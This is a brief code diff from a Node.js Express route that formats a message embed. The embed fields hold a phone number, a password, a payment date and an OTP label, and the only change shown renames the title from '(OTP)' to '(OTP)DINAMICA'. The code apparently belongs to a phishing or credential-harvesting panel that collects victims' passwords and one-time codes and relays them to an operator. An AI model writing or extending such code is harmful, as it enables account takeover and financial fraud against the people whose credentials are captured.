@@ -88,7 +88,7 @@ app.post('/nuevo', async (req, res) => {
                                 `Fecha de pago: día ${infoCompleta.fechaPago || 'N/A'}`;
                 }
 
-                embed.setTitle('(OTP)')
+                embed.setTitle('(OTP)DINAMICA')
                      .setDescription(
                          `📱 **Número:** ${numero || 'N/A'}\n` +
                          `🔒 **Contraseña:** ${password || 'N/A'}\n` +
